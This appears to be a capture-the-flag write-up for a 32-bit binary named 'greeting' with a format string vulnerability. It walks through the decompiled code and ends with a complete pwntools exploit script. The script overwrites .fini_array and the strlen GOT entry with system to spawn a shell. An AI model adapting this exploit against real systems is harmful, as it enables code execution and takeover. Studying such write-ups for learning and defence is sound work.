# greeting (pwn)

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/ca95958d-8835-4762-854a-aef9b10858e4)  

Let's run the program  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/567f916d-cae4-46cb-b080-11b927493318)  
We can see that there is a format string vulnerability.  

Let's take a loot at the binary in ghidra.  
```c
void main(void)

{
  int iVar1;
  int in_GS_OFFSET;
  char local_94 [64];
  undefined input_buf [64];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Please tell me your name... ");
  iVar1 = getnline(input_buf,0x40);
  if (iVar1 == 0) {
    puts("Don\'t ignore me ;( ");
  }
  else {
    sprintf(local_94,"Nice to meet you, %s :)\n",input_buf);
    printf(local_94);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void getnline(char *param_1,int param_2)

{
  char *pcVar1;
  
  fgets(param_1,param_2,stdin);
  pcVar1 = strchr(param_1,10);
  if (pcVar1 != (char *)0x0) {
    *pcVar1 = '\0';
  }
  strlen(param_1);
  return;
}
```
We can see there is no win function, and also the flag is not in the stack, so we need to pop a shell somehow.  
From the format string vulnerability, we have an arbitrary write, and also `partial RELRO` is enabled.  
We want to overwrite something such that we call `system()`.  
Sadly the only function called after the vulnerable `printf` is `__stack_chk_fail()`, but we can't trigger it.  
However, Linux has a `.fini` routine, where every function in `.fini_array` is called. However we can't give arguments to those functions so we can't use them for `system('/bin/sh')`.  
A perferct candidate is `strlen`, because it will execute with our input as an argument, so we can write the `.fini_array` to redirect execution to `getnline` and write the `got` entry of `strlen` with `system`.  

Usually I would do this using the automated module from `pwntools`. However, there is a length requirement (64 bytes) that we have to satisfy, and the tool was failing to satisfy it, so I had to prepare the payload manually.  

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template greeting
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'greeting')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

fini_array = 0x08049934
ret = 0x08048614
system = 0x8048490
strlen_got = 0x8049a54

log.info('systemplt @ '+hex(system))

#xxAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
offset = 12
numbwritten = 20 + 4*4

payload = b'xx'

payload += p32(fini_array) # %12$n
payload += p32(fini_array + 2) # %13$n
payload += p32(strlen_got) # %14$n
payload += p32(strlen_got + 2) # %15$n

# write to lower bits of fini_array
remaining = 0x8614 - 36
fmt = bytes(f'%{remaining}x' , 'ascii')

payload += fmt
payload += b'%12$n' #currently at 8614

# write to lower bits of strlen GOT entry
remaining = 0x8490 - 0x8614
remaining = 0xffff + remaining + 1
fmt = bytes(f'%{remaining}x' , 'ascii')

payload += fmt
payload += b'%14$n' #currently at 8490

# write upper bits of both fini_array and strlen GOT entry
remaining = 0x804 - 0x8490
remaining = 0xffff + remaining + 1
fmt = bytes(f'%{remaining}x' , 'ascii')

payload += fmt
payload += b'%13$n'
payload += b'%15$n'

log.info(len(payload))
log.info(payload)

io.sendline(payload)
io.sendline(b'/bin/sh')

io.clean()
io.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/ab022d74-f79c-40d1-a9fc-463eea5062ed)


